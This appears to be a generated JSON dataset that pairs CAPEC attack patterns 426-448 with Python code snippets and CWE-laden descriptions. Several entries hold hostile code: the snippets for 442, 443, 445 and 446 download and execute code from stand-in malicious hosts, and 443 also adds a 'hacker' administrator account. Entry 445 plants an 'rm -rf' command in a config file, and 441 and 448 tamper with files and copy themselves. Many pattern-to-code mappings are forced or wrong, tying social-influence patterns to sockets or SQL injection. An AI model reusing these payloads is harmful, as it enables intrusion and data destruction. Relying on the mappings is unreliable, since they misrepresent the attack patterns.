        "code_snippet": "import requests\n\nclass FramingInfluence:\n    def __init__(self, base_url):\n        self.base_url = base_url\n\n    def make_request(self, endpoint, params):\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        url = f'{self.base_url}/{endpoint}'\n        try:\n            response = requests.get(url, params=params)\n            if response.status_code == 200:\n                # CWE-451: UI Misrepresentation of Critical Information\n                print('Request successful! Here is the data you requested.')\n                return response.json()\n            else:\n                print('Request failed. Please try again.')\n        except requests.exceptions.RequestException as e:\n            print(f'An error occurred: {e}')\n\n    def influence_target(self, target_data):\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        if 'important_key' in target_data:\n            # CWE-757: Selection of Less-Secure Algorithm During Negotiation\n            print('Using less secure method for compatibility.')\n            return self.make_request('less_secure_endpoint', target_data)\n        else:\n            print('Using secure method.')\n            return self.make_request('secure_endpoint', target_data)\n\n# Example usage\nframing = FramingInfluence('http://example.com')\ntarget_data = {'important_key': 'value'}\nframing.influence_target(target_data)",
        "description": "This Python code snippet demonstrates a class `FramingInfluence` that embodies the concept of 'Target Influence via Framing' by making HTTP requests to a specified base URL. The `make_request` method constructs a URL and makes a GET request, handling potential errors and misrepresenting the success of the request to the user (CWE-451). The `influence_target` method decides which endpoint to use based on the presence of a key in the target data, relying on a single factor for this decision (CWE-654). It also demonstrates the selection of a less secure endpoint for compatibility (CWE-757). The code highlights how framing techniques can be used to influence the target's perception and actions by controlling the information and context presented to them."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import random\n\nclass User:\n    def __init__(self, username, balance):\n        self.username = username\n        self.balance = balance\n\n    def transfer(self, amount, recipient):\n        if self.balance >= amount:\n            self.balance -= amount\n            recipient.balance += amount\n            print(f\"Transferred {amount} to {recipient.username}\")\n        else:\n            print(\"Insufficient balance\")\n\nclass Adversary:\n    def __init__(self, target):\n        self.target = target\n\n    def incentivize(self):\n        # Simulate gathering information about the target's vulnerability\n        incentive = random.choice(['financial', 'social', 'ideological'])\n        print(f\"Using {incentive} incentive to influence {self.target.username}\")\n        if incentive == 'financial':\n            self.target.transfer(100, self)\n        elif incentive == 'social':\n            print(f\"{self.target.username} is influenced by peer pressure\")\n        elif incentive == 'ideological':\n            print(f\"{self.target.username} is influenced by ideological beliefs\")\n\n# Example usage\nuser = User('victim', 150)\nadversary = Adversary(user)\nadversary.incentivize()",
        "description": "This Python code snippet demonstrates the concept of 'Influence via Incentives' by simulating an adversary who gathers information about a target's vulnerabilities and uses different types of incentives (financial, social, ideological) to influence the target's behavior. The User class represents a user with a balance, and the Adversary class represents an attacker who tries to manipulate the user. The code also indirectly touches on related CWEs: it creates a new resource (financial transfer) that can be exploited (CWE-1229), and it relies on a single factor (user's balance) for security decisions (CWE-654)."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-205: Observable Behavioral Discrepancy\n\n# Simulated user database\nusers = {'admin': 'password123'}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users and users[username] == password:\n        return True\n    return False\n\n# Function to simulate a reflection attack\ndef reflection_attack(target_username):\n    # Attacker uses the target's username to attempt authentication\n    attacker_username = target_username\n    attacker_password = getpass.getpass(prompt='Enter password for {}: '.format(attacker_username))\n    if authenticate(attacker_username, attacker_password):\n        print('Access granted to attacker!')\n    else:\n        print('Access denied to attacker.')\n\n# Main function\nif __name__ == '__main__':\n    target_username = 'admin'\n    reflection_attack(target_username)",
        "description": "This Python code snippet demonstrates a reflection attack on an authentication protocol, leveraging psychological principles to influence user behavior. The code simulates a simple authentication system (CWE-654) that relies on a single factor (username and password). An attacker can use the target's username to attempt authentication (CWE-301). The use of getpass to prompt for a password can reveal behavioral discrepancies (CWE-205) as the attacker tries to mimic the target's behavior. This code highlights how an adversary can exploit human factors and simple security mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_server(host, port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind((host, port))\n    server_socket.listen(5)\n    print(f'Server listening on {host}:{port}')\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f'Connection from {addr}')\n        handle_client(client_socket)\n\n\ndef handle_client(client_socket):\n    try:\n        # CWE-940: No verification of the source\n        data = client_socket.recv(1024)\n        print(f'Received data: {data.decode()}')\n\n        # CWE-301: Reflection attack vulnerability\n        client_socket.send(data)\n        print(f'Sent data back: {data.decode()}')\n    finally:\n        client_socket.close()\n\n\nif __name__ == '__main__':\n    create_server('0.0.0.0', 9999)",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and echoes back any received data. The code embodies the main idea of CAPEC-Influence via Modes of Thinking by showing how an adversary can manipulate communication channels. The server does not verify the source of the incoming connection (CWE-940), making it susceptible to unauthorized access. Additionally, the server reflects the received data back to the client without any validation (CWE-301), which can be exploited in reflection attacks. This setup can be used by an adversary to build rapport with a target by mimicking their communication patterns, making the target more likely to share sensitive information."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import random\n\nclass SecuritySystem:\n    def __init__(self):\n        self.internal_state = random.choice(['secure', 'compromised'])\n\n    def authenticate_user(self, user_input):\n        if self.internal_state == 'compromised':\n            print('Authentication failed.')  # Observable discrepancy\n        else:\n            if user_input == 'correct_password':\n                print('Authentication successful.')\n            else:\n                print('Authentication failed.')\n\n    def display_security_info(self):\n        info = 'Security status: ' + self.internal_state\n        print(info[:10])  # Truncation of security-relevant information\n\n    def show_ui(self):\n        if self.internal_state == 'compromised':\n            print('System secure')  # UI misrepresentation of critical information\n        else:\n            print('System secure')\n\n# Simulate the system\nsystem = SecuritySystem()\nuser_input = input('Enter password: ')\nsystem.authenticate_user(user_input)\nsystem.display_security_info()\nsystem.show_ui()",
        "description": "This Python code snippet represents a security system that can be in either a 'secure' or 'compromised' state. The system's behavior changes based on its internal state, which can be observed by an unauthorized actor. The 'authenticate_user' method shows an observable discrepancy by revealing the internal state through different responses. The 'display_security_info' method truncates security-relevant information, potentially obscuring the true state. The 'show_ui' method misrepresents critical information by always displaying 'System secure', even if the system is compromised. This code embodies the CAPEC idea of gaining information through non-verbal cues and incorporates related CWEs such as observable discrepancies, truncation of information, and UI misrepresentation."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport time\nimport random\n\n# Setup logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate speculative execution vulnerability\nclass Processor:\n    def __init__(self):\n        self.secret_data = 'Sensitive Information'\n\n    def execute(self, condition):\n        # Simulate transient execution\n        if condition:\n            # Speculative execution path\n            logging.debug(f'Accessing secret data: {self.secret_data}')\n        else:\n            # Correct execution path\n            logging.debug('No access to secret data')\n\n# Simulate excessive attack surface\nclass Server:\n    def __init__(self):\n        self.processor = Processor()\n\n    def handle_request(self, user_input):\n        # Simulate a condition that could lead to speculative execution\n        condition = random.choice([True, False])\n        self.processor.execute(condition)\n\n# Main function to simulate server handling requests\nif __name__ == '__main__':\n    server = Server()\n    for _ in range(10):\n        user_input = input('Enter request: ')\n        server.handle_request(user_input)\n        time.sleep(1)",
        "description": "This Python code snippet simulates a speculative execution vulnerability in a processor, which can lead to the exposure of sensitive information. The `Processor` class contains a method `execute` that logs access to secret data based on a condition, mimicking transient execution paths. The `Server` class represents a system with an excessive attack surface, handling user requests and potentially triggering speculative execution. The logging setup writes debug information to a server log file, which could expose sensitive information. This code embodies the main idea of the deprecated CAPEC by demonstrating how microarchitectural state and speculative execution can lead to information exposure, with additional context from related CWEs."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if not user_input.isalnum():\n        # CWE-81: Improper Neutralization of Script in an Error Message Web Page\n        error_message = f\"<h1>Error: Invalid input {user_input}</h1>\"\n        return error_message\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    template = \"<h1>Welcome, {{ user_input }}</h1>\"\n    return render_template_string(template, user_input=user_input)\n\n@app.errorhandler(500)\ndef internal_error(error):\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    return f\"<h1>Server Error: {error}</h1>\", 500\n\nif __name__ == '__main__':\n    # CWE-1125: Excessive Attack Surface\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates several common security weaknesses. The '/submit' route accepts user input via a POST request. The input is not properly validated (CWE-1286), and if it contains non-alphanumeric characters, an error message is generated without neutralizing special characters (CWE-81). The user input is then inserted into a template without proper neutralization (CWE-1336). Additionally, the application generates error messages that may contain sensitive information (CWE-209). Finally, the application runs in debug mode, which increases the attack surface (CWE-1125). This code embodies the deprecated CAPEC pattern by showing how improper handling of input and error messages can lead to vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import re\n\n# Simulate user input\nuser_input = \"' OR '1'='1\"\n\n# Vulnerable function that improperly validates input\n# and is susceptible to SQL injection\n\ndef vulnerable_query(user_input):\n    # Improper neutralization of quoting syntax (CWE-149)\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    print(f\"Executing query: {query}\")\n    # Simulate execution of the query\n    # In a real scenario, this would be executed against a database\n    return query\n\n# Call the vulnerable function\nvulnerable_query(user_input)\n\n# Example of improper validation of syntactic correctness of input (CWE-1286)\ndef validate_input(input_string):\n    # This regex is too simplistic and does not properly validate the input\n    if not re.match(r'^[a-zA-Z0-9_]+$', input_string):\n        raise ValueError(\"Invalid input!\")\n    return input_string\n\ntry:\n    validate_input(user_input)\nexcept ValueError as e:\n    print(e)\n\n# Example of guessable CAPTCHA (CWE-804)\ndef simple_captcha():\n    # A very simple and guessable CAPTCHA\n    return \"1234\"\n\ncaptcha = simple_captcha()\nuser_captcha_input = \"1234\"\n\nif user_captcha_input == captcha:\n    print(\"CAPTCHA passed\")\nelse:\n    print(\"CAPTCHA failed\")",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Target Influence via Voice in NLP' and the associated CWEs. The `vulnerable_query` function shows improper neutralization of quoting syntax (CWE-149), making it susceptible to SQL injection attacks. The `validate_input` function demonstrates improper validation of syntactic correctness of input (CWE-1286), as it uses a simplistic regex that fails to properly validate the input. Finally, the `simple_captcha` function represents a guessable CAPTCHA (CWE-804), which can be easily bypassed by a non-human actor. These examples highlight common security weaknesses that can be exploited if proper validation and security measures are not implemented."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-120: Buffer Copy without Checking Size of Input\n\ndef send_message(host, port, message):\n    try:\n        # Establish a connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n\n        # CWE-319: Sending sensitive information in cleartext\n        s.sendall(message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the received message\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n\n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# CWE-120: Buffer Copy without Checking Size of Input\n# This function simulates a buffer overflow vulnerability\n\ndef vulnerable_buffer_copy(input_data):\n    buffer = bytearray(10)  # Small buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No size check, potential overflow\n    return buffer\n\n# Example usage\nhost = 'localhost'\nport = 12345\nmessage = 'Sensitive data'\n\nsend_message(host, port, message)\n\n# Simulate buffer overflow\ninput_data = bytearray(b'A' * 20)  # Input larger than buffer size\nvulnerable_buffer_copy(input_data)",
        "description": "This Python code snippet demonstrates the concept of 'Target Influence via The Human Buffer Overflow' by embedding multiple vulnerabilities related to buffer overflows and improper message handling. The `send_message` function establishes a socket connection and sends a message in cleartext (CWE-319), without ensuring message integrity (CWE-924). The `vulnerable_buffer_copy` function simulates a classic buffer overflow (CWE-120) by copying data into a buffer without checking the size, potentially leading to memory corruption. This code represents how subtle vulnerabilities in communication and buffer handling can be exploited, akin to embedding subconscious commands in human communication."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\nclass SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {'user1': 'password123', 'user2': 'qwerty'}\n        self.captcha_answers = ['1234', 'abcd']\n\n    def query_data(self, user):\n        # CWE-202: Exposure of Sensitive Information Through Data Queries\n        if user in self.sensitive_data:\n            return self.sensitive_data[user]\n        else:\n            return 'No data found'\n\n    def authenticate_user(self, user, password, captcha):\n        # CWE-804: Guessable CAPTCHA\n        if captcha in self.captcha_answers:\n            # CWE-205: Observable Behavioral Discrepancy\n            if user in self.sensitive_data and self.sensitive_data[user] == password:\n                return 'Authentication successful'\n            else:\n                return 'Authentication failed'\n        else:\n            return 'Invalid CAPTCHA'\n\n    def update_policy(self, user, new_policy):\n        # CWE-213: Exposure of Sensitive Information Due to Incompatible Policies\n        if user in self.sensitive_data:\n            self.sensitive_data[user] = new_policy\n            return 'Policy updated'\n        else:\n            return 'User not found'\n\n    def check_data_source(self, data_source):\n        # CWE-1293: Missing Source Correlation of Multiple Independent Data\n        if data_source == 'trusted_source':\n            return 'Data source is trusted'\n        else:\n            return 'Data source is not trusted'\n\nhandler = SensitiveDataHandler()\nprint(handler.query_data('user1'))\nprint(handler.authenticate_user('user1', 'password123', '1234'))\nprint(handler.update_policy('user1', 'new_password'))\nprint(handler.check_data_source('untrusted_source'))",
        "description": "This Python code snippet represents a class `SensitiveDataHandler` that handles sensitive data queries, user authentication, policy updates, and data source verification. The code embodies the main idea of CAPEC 'Target Influence via Interview and Interrogation' by demonstrating how sensitive information can be exposed through various weaknesses:\n\n1. **CWE-202: Exposure of Sensitive Information Through Data Queries** - The `query_data` method returns sensitive information if the user exists.\n2. **CWE-804: Guessable CAPTCHA** - The `authenticate_user` method uses a simple, guessable CAPTCHA for authentication.\n3. **CWE-205: Observable Behavioral Discrepancy** - The `authenticate_user` method reveals different behaviors based on the correctness of the user credentials and CAPTCHA.\n4. **CWE-213: Exposure of Sensitive Information Due to Incompatible Policies** - The `update_policy` method updates user policies without considering the security policies of other stakeholders.\n5. **CWE-1293: Missing Source Correlation of Multiple Independent Data** - The `check_data_source` method relies on a single data source to determine trustworthiness.\n\nThe code demonstrates how these weaknesses can be exploited to infer or expose sensitive information, aligning with the CAPEC's main idea."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef establish_channel(destination):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((destination, 80))\n        return s\n    except Exception as e:\n        print(f\"Connection failed: {e}\")\n        return None\n\n# Function to handle incoming requests without proper verification\n\ndef handle_request(conn):\n    data = conn.recv(1024)\n    if data:\n        print(f\"Received data: {data}\")\n        # Observable behavioral discrepancy\n        if b'secret' in data:\n            print(\"Sensitive data detected!\")\n        else:\n            print(\"Normal data received.\")\n\n# Example usage\n\ndestination = \"example.com\"  # Incorrectly specified destination\nconn = establish_channel(destination)\nif conn:\n    handle_request(conn)\n",
        "description": "This Python code snippet demonstrates a vulnerable implementation of establishing and handling a communication channel. The `establish_channel` function attempts to connect to a specified destination without verifying the identity of the endpoint (CWE-300). The `handle_request` function processes incoming data without verifying the source (CWE-940) and exhibits observable behavioral discrepancies based on the content of the data (CWE-205). The destination is incorrectly specified (CWE-941), and the code does not prevent external influence on the control flow (CWE-673). This embodies the main idea of 'Target Influence via Instant Rapport' by allowing an attacker to influence the communication channel and observe behavioral discrepancies."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "class Device:\n    def __init__(self, components):\n        self.components = components\n        self.trusted_components = ['trusted_component_1', 'trusted_component_2']\n\n    def manufacture(self):\n        for component in self.components:\n            if component not in self.trusted_components:\n                self.modify_component(component)\n\n    def modify_component(self, component):\n        # Malicious modification of the component\n        print(f\"Modifying {component} during manufacture...\")\n        # Example of a malicious modification\n        component += '_malicious'\n        return component\n\n# Example usage\ncomponents = ['trusted_component_1', 'untrusted_component_1', 'trusted_component_2']\ndevice = Device(components)\ndevice.manufacture()",
        "description": "This Python code snippet represents the concept of 'Modification During Manufacture' (CAPEC-Name) by simulating a scenario where a device is being manufactured using multiple components. The 'Device' class initializes with a list of components and a list of trusted components. During the manufacturing process, if a component is not in the list of trusted components, it is maliciously modified by the 'modify_component' method. This embodies the idea of an attacker modifying a product during its manufacture. The code also touches on related CWEs such as 'Reliance on Insufficiently Trustworthy Component' (CWE-1357) by checking if components are trusted, and 'Product Released in Non-Release Configuration' (CWE-1269) by modifying components during the manufacturing process."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a third-party library with known vulnerabilities\nresponse = requests.get('http://example.com')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Exposing sensitive information in the response\nif response.status_code == 200:\n    print('Sensitive Data:', response.text)\n\n# CWE-1269: Product Released in Non-Release Configuration\n# Debug mode enabled in production\nDEBUG = True\nif DEBUG:\n    print('Debug mode is enabled')\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Using an untrusted component for critical functionality\ntry:\n    import untrusted_component\n    untrusted_component.perform_critical_task()\nexcept ImportError:\n    print('Failed to import untrusted component')\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Different behavior in debug mode\nif DEBUG:\n    print('This is a debug build')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It uses a third-party library with known vulnerabilities (CWE-1395), exposes sensitive information to unauthorized actors (CWE-200), runs in a non-release configuration with debug mode enabled (CWE-1269), relies on an insufficiently trustworthy component (CWE-1357), and exhibits observable behavioral discrepancies in debug mode (CWE-207). These issues highlight the risks of tampering and manipulation during the distribution of software products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, version):\n        self.version = version\n        self.redundant_block = True\n        self.voltage_protection = True\n        self.clock_protection = True\n        self.security_version = version\n\n    def inject_error(self):\n        if random.choice([True, False]):\n            self.redundant_block = False\n            print('Error injected: Redundancy compromised.')\n        else:\n            print('Error injection failed.')\n\n    def glitch_voltage_clock(self):\n        self.voltage_protection = False\n        self.clock_protection = False\n        print('Voltage and clock glitch protection disabled.')\n\n    def downgrade_firmware(self, new_version):\n        if new_version < self.version:\n            self.security_version = new_version\n            print(f'Firmware downgraded to version {new_version}.')\n        else:\n            print('Downgrade failed: New version is not older.')\n\n# Simulate an attack\ncomponent = HardwareComponent(version=2.0)\ncomponent.inject_error()\ncomponent.glitch_voltage_clock()\ncomponent.downgrade_firmware(1.0)",
        "description": "This Python code snippet simulates a hardware integrity attack by exploiting various weaknesses described in the CAPEC and related CWEs. The `HardwareComponent` class represents a hardware component with attributes for redundancy, voltage and clock protection, and firmware version. The `inject_error` method simulates unauthorized error injection to compromise redundancy (CWE-1334). The `glitch_voltage_clock` method disables voltage and clock glitch protection (CWE-1247). The `downgrade_firmware` method allows downgrading the firmware to an older, potentially vulnerable version (CWE-1328). This code demonstrates how an adversary might exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-284: Improper Access Control\n\n# Malicious logic hidden in a seemingly benign function\nclass GreetingCard:\n    def __init__(self, message):\n        self.message = message\n\n    def display_message(self):\n        print(self.message)\n        self._install_malware()\n\n    def _install_malware(self):\n        # Malicious logic: create a hidden file and replicate itself\n        with open('hidden_malware.py', 'w') as f:\n            f.write(\"import os\\nimport sys\\n# Malicious code that replicates itself\\n\")\n        os.system('cp hidden_malware.py /tmp/hidden_malware.py')\n        # Improper access control: execute without user consent\n        os.system('python3 /tmp/hidden_malware.py')\n\n# Usage of the GreetingCard class\ncard = GreetingCard('Happy Birthday!')\ncard.display_message()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic within a seemingly benign class, `GreetingCard`. The class has a method `display_message` that prints a message and then calls a hidden method `_install_malware`. This hidden method creates a malicious script (`hidden_malware.py`) and replicates it to another location (`/tmp/hidden_malware.py`). It then executes the script without user consent, representing improper access control. This snippet embodies the CAPEC idea by showing how malicious logic can be inserted into a benign component, leveraging CWE-506 (Embedded Malicious Code), CWE-509 (Replicating Malicious Code), and CWE-284 (Improper Access Control)."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import requests\n\n# Benign function\ndef benign_function():\n    print('This is a benign function.')\n\n# Malicious code hidden within the benign software\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-494: Download of Code Without Integrity Check\n# CWE-508: Non-Replicating Malicious Code\n\n# Hidden malicious function\ndef malicious_function():\n    url = 'http://malicious.example.com/malware'\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)  # CWE-494: Executing downloaded code without integrity check\n\n# Main function that calls both benign and malicious functions\nif __name__ == '__main__':\n    benign_function()\n    malicious_function()  # This call is hidden from the user",
        "description": "This Python code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The code includes a benign function that appears harmless to the user. However, it also contains a hidden malicious function that downloads and executes code from a remote server without verifying its integrity (CWE-494). This hidden function represents embedded malicious code (CWE-506) and a Trojan Horse (CWE-507), as it violates the intended security policy while appearing benign. The malicious code does not attempt to replicate itself (CWE-508), making it a non-replicating malicious code. The main function calls both the benign and malicious functions, with the malicious call being hidden from the user."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\nclass MaliciousModule:\n    def __init__(self, url):\n        self.url = url\n\n    def download_and_execute(self):\n        response = requests.get(self.url)\n        if response.status_code == 200:\n            exec(response.text)\n        else:\n            print('Failed to download code')\n\n    def create_backdoor(self):\n        os.system('net user hacker P@ssw0rd /add')\n        os.system('net localgroup administrators hacker /add')\n\n# Example usage\nmalicious = MaliciousModule('http://malicious.example.com/malware.py')\nmalicious.download_and_execute()\nmalicious.create_backdoor()",
        "description": "This Python code snippet represents a scenario where an authorized developer injects malicious logic into a product. The `MaliciousModule` class has two main functions: `download_and_execute` and `create_backdoor`. The `download_and_execute` method downloads code from a specified URL and executes it without verifying its integrity (CWE-494). The `create_backdoor` method creates a new user with administrative privileges, representing insecure inherited permissions (CWE-277). This code embodies the CAPEC idea of an adversary using their privileged position to inject malicious logic into a codebase or product."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# This function appears to be a legitimate function but contains malicious code\n\ndef legitimate_function(data):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    sensitive_info = os.getenv('SECRET_KEY')\n    print(f\"Processing data: {data}\")\n    # CWE-913: Improper Control of Dynamically-Managed Code Resources\n    exec(f\"malicious_code = '{sensitive_info}'\")  # Malicious code execution\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# The following security check might be optimized away by the compiler or processor\n\nsecurity_check = True\nif security_check:\n    legitimate_function('example_data')\nelse:\n    print(\"Security check failed\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary has embedded malicious code within a seemingly legitimate function, representing the main idea of CAPEC-0037 (Development Alteration). The function `legitimate_function` appears to process data but also contains code that exposes sensitive system information (CWE-497) and improperly controls dynamically-managed code resources (CWE-913) by executing a string containing sensitive information. Additionally, the code includes a security check that could be optimized away by the compiler or processor (CWE-733 and CWE-1037), potentially removing critical security mechanisms. This snippet illustrates how an adversary might alter the development process to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\ndef update_configuration(config_file):\n    with open(config_file, 'a') as f:\n        f.write('\\n# Malicious configuration change\\n')\n        f.write('os.system(\"rm -rf /important_data\")')\n\n# Simulate a configuration update\nupdate_configuration('config.txt')",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a Python script from an untrusted source (CWE-494) and executes it without verifying its integrity (CWE-829). The downloaded script contains embedded malicious code (CWE-506) that improperly controls dynamically-managed code resources (CWE-913) and could lead to unintended reentrant invocation (CWE-1265). Additionally, the `update_configuration` function simulates a malicious configuration change by appending a command to delete important data to a configuration file, representing how an adversary might manipulate configuration management to deploy insecure software."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# Importing a third-party library from an untrusted source\ntry:\n    response = requests.get('http://untrusted-source.com/malicious_library.py')\n    with open('malicious_library.py', 'w') as file:\n        file.write(response.text)\nexcept Exception as e:\n    print(f'Error downloading the library: {e}')\n\n# CWE-506: Embedded Malicious Code\n# Executing the downloaded malicious code\ntry:\n    import malicious_library\n    malicious_library.execute_malicious_code()\nexcept Exception as e:\n    print(f'Error executing malicious code: {e}')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# CWE-1103: Use of Platform-Dependent Third Party Components\n# The downloaded library may have known vulnerabilities, be untrustworthy, or platform-dependent\n",
        "description": "This Python code snippet demonstrates the inclusion of a third-party component from an untrusted source, which is a common supply chain attack vector. The code downloads a potentially malicious library from an untrusted URL and executes it. This embodies the CAPEC's main idea of malicious logic insertion via third-party components. The code also highlights several related CWEs: CWE-829 (importing from an untrusted source), CWE-506 (executing embedded malicious code), CWE-1395 (dependency on a vulnerable component), CWE-1357 (reliance on an untrustworthy component), and CWE-1103 (use of platform-dependent components)."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "class SecureSystem:\n    def __init__(self):\n        self._sensitive_data = 'Sensitive Information'\n        self._security_check_enabled = True\n\n    def access_sensitive_data(self, user_role):\n        if self._security_check_enabled:\n            if user_role == 'admin':\n                return self._sensitive_data\n            else:\n                return 'Access Denied'\n        else:\n            return self._sensitive_data\n\n# Design alteration: Disable security check\nsecure_system = SecureSystem()\nsecure_system._security_check_enabled = False\n\n# Unauthorized access due to design alteration\nprint(secure_system.access_sensitive_data('guest'))",
        "description": "This Python code snippet represents a design alteration attack where an adversary modifies the design of a system to disable a security-critical protection mechanism. The `SecureSystem` class contains a security check to control access to sensitive data based on user roles. However, the design alteration is simulated by setting `_security_check_enabled` to `False`, which allows unauthorized access to sensitive data. This example embodies the main idea of CAPEC-Design Alteration and demonstrates related CWEs such as 'Processor Optimization Removal or Modification of Security-critical Code' (CWE-1037) and 'Violation of Secure Design Principles' (CWE-657)."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-426: Untrusted Search Path\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\path\\to\\legit.dll'\n\n# Malicious payload to be embedded\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # NOP sled as a placeholder\n\n# Function to embed malicious code into the DLL\ndef embed_virus(dll_path, payload):\n    with open(dll_path, 'rb+') as dll_file:\n        content = dll_file.read()\n        # Find a gap to insert the payload (simplified for demonstration)\n        gap_index = content.find(b'\\x00' * len(payload))\n        if gap_index != -1:\n            dll_file.seek(gap_index)\n            dll_file.write(payload)\n        else:\n            print('No suitable gap found')\n\n# Embed the virus into the legitimate DLL\nembed_virus(legit_dll_path, malicious_code)\n\n# Load the tampered DLL (CWE-426)\ndll = ctypes.CDLL(legit_dll_path)\n\n# Example function call to the tampered DLL\ntry:\n    dll.some_function()\nexcept Exception as e:\n    print(f'Error calling function: {e}')\n\n# Replicating malicious code (CWE-509)\ndef replicate_virus(target_path):\n    with open(target_path, 'wb') as target_file:\n        with open(legit_dll_path, 'rb') as source_file:\n            target_file.write(source_file.read())\n\n# Example of replicating the virus to another location\nreplicate_virus('C:\\path\\to\\infected_copy.dll')",
